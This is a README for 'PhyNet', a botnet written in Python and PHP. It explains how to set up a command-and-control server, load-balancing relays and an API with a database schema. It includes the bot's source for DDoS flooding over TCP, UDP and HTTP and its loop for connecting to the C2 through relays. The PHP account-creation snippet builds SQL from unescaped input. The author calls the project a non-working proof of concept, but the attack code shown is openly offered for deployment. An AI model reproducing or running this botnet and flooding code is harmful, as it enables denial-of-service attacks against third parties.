# PhyNet
 phynet is a botnet coded in python and php, wich is using relays for balancing bots and uses only one cnc.  
 phynet is an old project in bad languages for a botnet and actually not working, you may want to uses oldest versions, you can consider this code as a POC of a easy balanced botnet

# CNC
Def: "Command and Control" (C&C) servers are centralized machines that are able to send commands and receive outputs of machines part of a botnet. Anytime attackers who wish to launch a DDoS attack can send special commands to their botnet's C&C servers with instructions to perform an attack on a particular target, and any infected machines communicating with the contacted C&C server will comply by launching a coordinated attack.   

My cnc works with a relay (which will relay the commands to the bots to avoid an overload of the cnc server), it also works with an api which will be mainly used to register the relay servers to be able to dispatch the bots on the server having the least load, the api will also be used to login on the cnc

for setup the [cnc](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/cnc/cnc.py):  
```batch
py cnc.py 8080    
```

# RELAY
for setup the [relay](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/relay/relay.py):  
```batch
py relay.py 5000
```

# API
for setup the [api](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2), you need a database:
## API Database:
```sql
SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";

DROP TABLE IF EXISTS `gkeys`;
CREATE TABLE IF NOT EXISTS `gkeys` (
  `gkey` text COLLATE utf8_unicode_ci NOT NULL,
  `ogkey` text COLLATE utf8_unicode_ci NOT NULL,
  `relay` text COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3 COLLATE=utf8_unicode_ci;

DROP TABLE IF EXISTS `relays`;
CREATE TABLE IF NOT EXISTS `relays` (
  `relay_ip` text COLLATE utf8_unicode_ci NOT NULL,
  `relay_bots` int NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3 COLLATE=utf8_unicode_ci;

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` text COLLATE utf8_unicode_ci NOT NULL,
  `password` text COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3 COLLATE=utf8_unicode_ci;

INSERT INTO `users` (`id`, `username`, `password`) VALUES
(1, 'root', '2b64f2e3f9fee1942af9ff60d40aa5a719db33b8ba8dd4864bb4f11e25ca2bee00907de32a59429602336cac832c8f2eeff5177cc14c864dd116c8bf6ca5d9a9');
COMMIT;
```
(the password encryption is sha512)   
In php you can use this function for generate a password
```php
function create_acc($usr, $pass) {

    global $conn;

    $pass=hash('sha256', $pass);
    $pass=hash('sha512', $pass);
    
    $sql="INSERT INTO users (username, password) VALUES ('$usr', '$pass')";
    $result=mysqli_query($conn, $sql);

    if ($result==TRUE) {

        echo json_encode("ok", JSON_PRETTY_PRINT);

    } else {

        echo json_encode("error", JSON_PRETTY_PRINT);

    }

}
```
Next, you need an php server for copy the api file ([SERVER/api/v1](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2))  
After you have to configure the database in the php script ([SERVER/api/v1/db_conn/db_connn.php](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2/db/db_conn.php))  
```php
$sname="localhost"; //database address
$unmae="root"; //database username
$password=""; //database password
$db_name="phybot"; //database name
$conn=mysqli_connect($sname, $unmae, $password, $db_name);

if (!$conn) {
    
	echo json_encode("db_connection_failed", JSON_PRETTY_PRINT);
}
```
You have to change your api url in:  
> the zomb ([CLIENT/zomb.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/bot/zomb.py)) `API_URL: str = "http://localhost/phybot/api/v1"` (L28),  
> the cnc config ([SERVER/cnc.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/cnc/modules/config.py)) `api_url="http://localhost/phybot/api/v1"` (L42),  
> and the relay config ([SERVER/relay.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/relay/modules/config.py)) `api_url="http://localhost/phybot/api/v1"` (L41)  

# ZOMB
you may want to compile the bot with nuitka (create a fast executable file because the python code is transpiled to c and compiled)
but the simple command for running it is:
```batch
py zomb.py
```
## ZOMB DDOS Code: 
```python
def dos(
    s: sock,
    attack: tuple[str, int],
    tps: int,
    method: str,
) -> None: # start dos attack with socket and attack target
    tps += int(time()) # set the attack time with actual time + attack time

    match method:
        case "TCP":
            log("TCP")
            while time() < tps:
                try:
                    s.connect(attack)
                    while time() < tps:
                        s.send(bytes(PAYLOAD, "utf-8"))
                except: pass

        case "UDP":
            log("UDP")
            while time() < tps:
                try:
                    s.sendto(bytes(PAYLOAD, "utf-8"), attack)
                except: pass

        case "HTTP":
            while time() < tps:
                try:
                    s.connect(attack)
                    while time() < tps:
                        s.send(f'GET / HTTP/1.1\r\nHost: {attack[0]}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())

                except: s.close()

        case _:
            log("Unknown")
            while time() < tps:
                try:
                    s.sendto(bytes(PAYLOAD, "utf-8"), attack)
                except: pass
```
## The ZOMB Socket Connection
```python
c2: sock = sock(AF_INET, SOCK_STREAM)
c2.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)

while 1:
    try:
        RELAY_ADDR: str = rget(f"{API_URL}/dispatch.php?urlkey={URL_KEY}", timeout=5000).text

        raddr.clear()
        raddr.append(RELAY_ADDR)

        c2.connect((RELAY_ADDR, RELAY_PORT))

        log((RELAY_ADDR, RELAY_PORT))

        while 1:
            data: str = c2.recv(1024).decode()

            if 'Username' in data:
                c2.send('BOT'.encode())
                log("send bot")
                break

        while 1:
            data: str = c2.recv(1024).decode()

            if 'Password' in data:
                c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                log("send bot string")
                break

        break
    except: sleep(240)
```
